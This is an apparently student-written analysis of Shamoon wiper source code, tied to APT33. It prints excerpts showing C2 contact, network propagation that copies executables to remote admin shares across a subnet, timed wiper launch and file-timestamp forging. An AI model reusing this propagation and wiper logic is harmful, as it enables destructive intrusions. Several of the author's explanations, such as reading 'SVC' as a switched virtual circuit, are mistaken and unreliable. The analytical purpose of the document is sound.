# SHAPESHIFT  
## The wiper malware used by APT33
> Code sampled from https://github.com/christian-roggia/open-shamoon and https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf

The code being analyzed is Shamoon, a close relative to SHAPESHIFT. Although Shamoon was never attributed to APT33, the similarity of the
SHAPESHIFT code and goals makes it seem likely that Shamoon was the work of APT33.

The code is publicly available on **christian-roggia** GitHub and portions of code available in the Kaspersky report linked available

## Analysis of Shamoon souce code

### C2.cpp [open-shamoon/open-malware/Modules/C2.cpp]
C2 stands for 'Command and control servers', which are used to enable communication between the infected computer and the attacker.

In the C2.cpp file are the three functions:
```
bool Shamoon::Modules::C2::GetC2Specific(WCHAR *lpszFileName, WCHAR *lpszFilePath)

bool Shamoon::Modules::C2::RunC2Service(const WCHAR *lpszCommand)

DWORD Shamoon::Modules::C2::ContactC2Server(LPVOID /*lpThreadParameter*/)
```

The first function attempts to navigate to the command and control server path using the provided filename.
```
M_STRING02(lpszFileName,
		
		C2_MODULE_NAME,
		L".exe"
	)
	
	// Get C&C absolute path
	M_STRING03(lpszFilePath,
		
		g_szWinDir,
		L"\\system32\\",
		lpszFileName
	)
  ```
  If the module that it navigates to already exists, it deletes the current file so that the new module can be made
  ```
  EXECUTE_WOW64_FILE_OPERATION(
		DeleteFileW(lpszFilePath);
	)
  ```
  In the second function, the goal is to run the C2 service. If the service is already running, true is returned.
  ```
  // ID already found, service running
  if(g_dwC2_ID)
		return true;
	```
  If not, the code attempts to run the service
  ```
  if(!StartServiceProcess(g_dwC2_Name, szSvcPath, &g_dwC2_ID))
		return false;
	```
  returning false if the service cannot be ran and true otherwise.
  
  In the last function, the goal is contacting the C2 server which will then allow the attacker to have full control and communication with the infected target.
  
  The code loops until the C2 service has been started, waiting for a few minutes in between calls to start the service
  ```
  // Thread sleep for 2~3 minutes
	SvcSleep(Shamoon::Utils::GetRandom() % 60 + 120);
	
	// The routine loops until the service has been sucessfully started
	while(!bSvcStopped)
	{
		// Macro to enter and leave critical section
		SYSTEM_CRITICAL_SECTION(
			// Try to run the C&C service
			RunC2Service(L"1");
		)
		
		// Thread sleep for 2~3 minutes
		SvcSleep(Shamoon::Utils::GetRandom() % 60 + 120);
	}
	
	return 0;
```

## 64bit.cpp & 32bit.cpp
These two files allow for the retrieval of information specific to both 32 bit and 64 bit machines, thus allowing for a greater scope of attack. The 32bit.cpp file is much more involved than the 64bit file, with the functions
```
bool Shamoon::Modules::_32bit::Start32bitService(LPCWSTR lpMachineName, const WCHAR *a2)

bool Shamoon::Modules::_32bit::Get32bitSpecific(WCHAR *szSvcName, WCHAR *szSvcPath)

bool Shamoon::Modules::_32bit::Save32bitModule()

bool Shamoon::Modules::_32bit::Setup32bitService()
```

Whereas 64bit has only 
```
bool Shamoon::Modules::_64bit::Get64bitSpecific(WCHAR *szSvcName, WCHAR *szSvcPath
```

## Infection.cpp

The bread and butter of the code; as the name would have it, Infection.cpp is responsible for the spreading of the malware that resulted
in tens of thousands of computers in the Middle East to be infected. Such another large scale attack is what is feared by many as Iranian hackers begin to lay the groundwork for another attack (as seen in the rise of phishing attacks)

The functions in this module:
```
bool WriteModuleOnSharedPC(LPCWSTR a1, LPCWSTR a2)

bool WriteModuleOnSharedNetwork()

bool WriteModuleOnSharedPCByArgv()
```

The first function is responsible for the infection of the current PC. The first step is acquiring the remote prefix (of the form "\\x.x.x.x\" 
```
M_STRING03
	(
		szRemotePrefix,

		L"\\\\",
		szRemoteAddr,
		L"\\"
	)
```
which is then used by string concatenation techniques to acquire a full pathname that will then allow for command execution. The format of the desired string is mentioned in comments.
```
while(1)
	{
		// Final format will be something like: "\\x.x.x.x\C$\\WINDOWS\\system32\\csrss.exe"
		memmove(&szSvcCSRSS[nPrefLen], pPart, strlenW(pPart) * sizeof(WCHAR));
		memmove(&szSvcCSRSS[nPrefLen + strlenW(pPart)], L"\\system32\\csrss.exe", strlenW(L"\\system32\\csrss.exe") * 
			sizeof(WCHAR));
		szSvcCSRSS[nPrefLen + strlenW(pPart) + strlenW(L"\\system32\\csrss.exe")] = 0;

		if(IsFileAccessible(szSvcCSRSS))
			break;
```
where the memmove function "is used to copy a block of memory from a location to another" (https://www.geeksforgeeks.org/memmove-in-cc/).
> void *memmove(void *str1, const void *str2, size_t n)

After the proper file path has been obtained, the code proceeds to apparently copy the malicious files and 'add a new job'.
The first part of the code searches for a random SVC (switched virtual circuit) that would allow for a connection that lasts long enough for data transfer
```
v17 = g_random_svc_name[GetRandom() % 29]
```
After, strcpyW is employed
> PWSTR StrCpyW(PWSTR  psz1, PCWSTR psz2)
where psz1 receives a copy of psz2. The functions used are probably wrappers, explaining the third paramter, which is the
size of the string (https://stackoverflow.com/questions/34889219/strcpy-with-3-parameters-reference-shows-only-2)

```
strcpyW(v46, v17, 2 * strlenW(v17));
strcpyW(&v46[strlenW(v17)], L".exe", 2 * strlenW(L".exe") + 2);
strcpyW(&szRemotePrefix[v33], v46, 2 * strlenW(v46) + 2);
```
The first parameters appear to be pointers in the remote system (target), while the second parameters (the thing being copied into paramter 1) are the infectious files, as indicated by the ".exe" extension in the second strcpy.

More strcpyWs are employed, with the intention to copy straight into the root directory:
```
strcpyW(v40, L"%SystemRoot%\\System32\\", 2 * strlenW(L"%SystemRoot%\\System32\\"));
strcpyW(&v40[strlenW(L"%SystemRoot%\\System32\\")], v46, 2 * strlenW(v46) + 2);
```
The next lines appear to set up the execution of the malicious code on the remote system as seen by 'AddNewJob' on what appears
to be a remote address
```	
if(AddNewJob(szRemoteAddr, v40))
	return true;
	
AddNewJob(szRemoteAddr, v46);
```
The next few strcpyWs appear to copy an executable "trksvr.exe" onto the remote system, and then a file is deleted (?)
An explanation for this may be to cover tracks and have the malware remove itself after infecting the target.
```
strcpyW(NewFileName, v42, 2 * strlenW(v42));
strcpyW(&NewFileName[strlenW(v42)], L"trksvr.exe", 2 * strlenW(L"trksvr.exe") + 2);
strcpyW(v39, L"%SystemRoot%\\System32\\", 2 * strlenW(L"%SystemRoot%\\System32\\"));
DeleteFileW(NewFileName);
```
After assuring "trlsvr.exe" is copied to remote
```
{
		v32 = 2 * strlenW(L"trksvr.exe") + 2;
		v31 = L"trksvr.exe";
	}
	
	strcpyW(&v39[strlenW(L"%SystemRoot%\\System32\\")], v31, v32);
```
the service is started 
```
if(Start32bitService(szRemoteAddr, v39))
		return true;
```

The second function in this module
```
bool Shamoon::Modules::Infection::WriteModuleOnSharedNetwork()
```
allows for a spread of the malware across a shared network (as the function name indicates)
Similar to above, the address of the remote must be obtained, in this case through getting the hostname
```
gethostname(szHostname, 50);
	struct hostent *sHost = gethostbyname(szHostname);
	
	DWORD nAddress; // Current address
	char **szAddrList;
```
In which it begins to iterate through the addresses on the host address list
```
for(szAddrList = sHost->h_addr_list, nAddress = 0; *szAddrList, nAddress < 10; szAddrList = &sHost->h_addr_list[nAddress++])
```
Where it begins to infect all PCs, assuring that it is infecting new ones everytime and iterating based on the last byte of the IP 
address:
```
UINT8 b8CurrentLastIpByte = in.s_impno, b8LastIpByte = 1;
		do
		{
			if(b8CurrentLastIpByte != b8LastIpByte)
			{
				in.s_impno = b8LastIpByte;
				
				if(strlen(inet_ntoa(in)) <= 19)
				{
					btowc(inet_ntoa(in), szPC_IP, strlen(inet_ntoa(in)));
					WriteModuleOnSharedPC(g_module_path, szPC_IP);
				}
			}
		}
		while(++b8LastIpByte < 255);
	}
```
where it invokes
```
WriteModuleOnSharedPC(g_module_path, szPC_IP);
```
on each iteration 


## Attack.cpp
The attack module contains the functions
```
bool GetAttackDateFromFile(WORD *a1);
int TimeToAttack();
bool LaunchAttack();
bool RunAttack(BOOL is_service_running);
```
In the Attack.h file, you can also see 
```
#define GARBAGE_STRING \
	"kijjjjnsnjbnncbknbkjadc\r\n" \
	"kjsdjbhjsdbhfcbsjkhdf	jhg jkhg hjk hjk	\r\n" \
	"slkdfjkhsbdfjbsdf \r\n" \
	"klsjdfjhsdkufskjdfh \r\n"

#define GARBAGE_FILE_PATH "c:\\windows\\temp\\out17626867.txt"
```
which will probably serve a purpose in covering tracks.
Additionally, a multitude of information related to time stamps are present, which may aid in avoiding detection
and having the option to attack in waves, sleeping a bit before the launch is attacked.
```
#define A_MINUTE 5
#define A_HOUR   4
#define A_DAY    3
#define A_MONTH  1
#define A_YEAR   0

#define IS_VALID_CONFIG_(v, m, s, k) { \
if(atoi(&szData[v*2]) > m) (bIsValidFile = false); else (lpawDate[s] = atoi(&szData[v*2]) + k); \
	szData[v*2] = 0; \
}

#define IS_VALID_CONFIG(v, m, s) IS_VALID_CONFIG_(v, m, s, 0)
#define IS_VALID_CONFIG_YEAR(v, m, s) IS_VALID_CONFIG_(v, m, s, 2000)
```

The first function appears to retrieve the information on when to launch the attack which is apparent from the name
```
bool Shamoon::Modules::Attack::GetAttackDateFromFile(WORD *lpawDate)
```
and the helper functions that serve to assess the validity of the date
```
bIsValidFile = true;
			
IS_VALID_CONFIG(4, 59, A_MINUTE)
IS_VALID_CONFIG(3, 23, A_HOUR)
IS_VALID_CONFIG(2, 30, A_DAY)
IS_VALID_CONFIG(1, 30, A_MONTH)
IS_VALID_CONFIG_YEAR(0, 98, A_YEAR)
			
if(lpawDate[A_DAY] > GetDaysInMonth(lpawDate[A_YEAR], lpawDate[A_MONTH]))
	bIsValidFile = false;
```
If the configuration wasn't able to be read or did not exist, then a default time was set
```
if(GetAttackDateFromFile(awDate) == false)
	{
		// Default time: 15/8/12 8:08
		awDate[A_YEAR  ] = 2012;
		awDate[A_MONTH ] = 8;
		awDate[A_HOUR  ] = 8;
		awDate[A_DAY   ] = 15;
		awDate[A_MINUTE] = 8;
	}
	
```
which could be compared to the actual time and date
```
SYSTEMTIME stNow;
GetSystemTime(&stNow);

...

if(stNow.wMonth >= awDate[A_MONTH] && stNow.wDay >= awDate[A_DAY] && stNow.wHour >= awDate[A_HOUR] && stNow.wMinute >= awDate[A_MINUTE])
		return 0;
```

The next function
```
bool Shamoon::Modules::Attack::LaunchAttack()
```
Is resposible for getting the wiper via use of a SVC 
```
g_dwWiperID = SearchProcessByIdOrName(g_dwWiperID, g_szWiperName);
	if(g_dwWiperID)
		goto LABEL_12;

	if(!GetWiperSpecific(g_szWiperName, svc_path))
```
It retrieves the wiper
```
WriteEncodedResource(svc_path, 0, (LPCWSTR)0x70, L"PKCS12", g_keys[KEY_PKCS12], 4)
```
where it proceeds to set a reliable file time to avoid suspicion
```
SetReliableFileTime(svc_path);
```
and then executes the wiper
```
if(StartServiceProcess(g_szWiperName, svc_path, &g_dwWiperID)) // Execute the wiper
	{
		
LABEL_12:
		/*v4 = LoadImageW(NULL, L"myimage12767", IMAGE_BITMAP, 0, 0, LR_MONOCHROME);
		if(v4)
		{
			// Only 18 characters, that's strange
			v6.write((const char *)v4, 18);
		}
		else
		{
			// That part of the code has no sense:
			// 25 bytes allocated, 20 filled with '@',
			// 18 written into the file
			char *awDate = new char[25];
			
			// Put some garbage
			memset(awDate, '@', 20);
			v6.write(awDate, 18);
			
			if(awDate) delete [] awDate;
		}*/
		
		return 1;
	}
	
	return 0;
}
```
The next function 
```
bool Shamoon::Modules::Attack::RunAttack(BOOL is_service_running)
```
(as the name would have it), runs the launched attack.

It first checks that the service is running, where it initializes necessary sections and objects. It also checks that either
the variable 'g_ready_to_attak' is true or that it is 'time to attack'
```
if(is_service_running == TRUE)
	{
		g_ready_to_attack = false;
		
		InitializeCriticalSection(&g_critical_section);
		SvcSleep(GetRandom() % 60 + 60);
		
		hObject = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ContactC2Server, NULL, 0, NULL);
		if(!bSvcStopped)
		{
			do
			{
				SYSTEM_CRITICAL_SECTION
				(
					DeleteWiperModules();
				)
				
				if(g_ready_to_attack || (time_to_attack = TimeToAttack()) == 0)
				{
```
Afterwards, the attack is launched
```
SYSTEM_CRITICAL_SECTION (LaunchAttack();)
```
If the time didn't match attack time, or ready to attack wasn't already true, the module is saved and a sleep timer is set for a bit
```
else
{
	Save32bitModule();
	SvcSleep(60 * time_to_attack + GetRandom() % 60);
}
```
Therefore, on the next iteration of the loop, the attack will be launched since g_ready_to_attack is now set to true.

After the function ends, the SVC connection is apparently closed, and the critical section is deleted (I imagine to cover tracks)
```
if(hObject != NULL)
		{
			WaitForSingleObject(hObject, WAIT_FAILED);
			CloseHandle(hObject);
		}
		
		DeleteCriticalSection(&g_critical_section);
```
Afterwords, command is handed to Infection.cpp, and the malware spreads on to destroy other computers. The computer is thus fully wiped at this point.
```
return (strlenW(g_argv[1]) == 1) ? WriteModuleOnSharedNetwork() : WriteModuleOnSharedPCByArgv();
```

## Wiper.cpp

The wiper file contains the functions
```
void Shamoon::Modules::Wiper::DeleteWiperModules()

bool Shamoon::Modules::Wiper::GetWiperSpecific(WCHAR *szSvcName, WCHAR *szSvcPath)
```
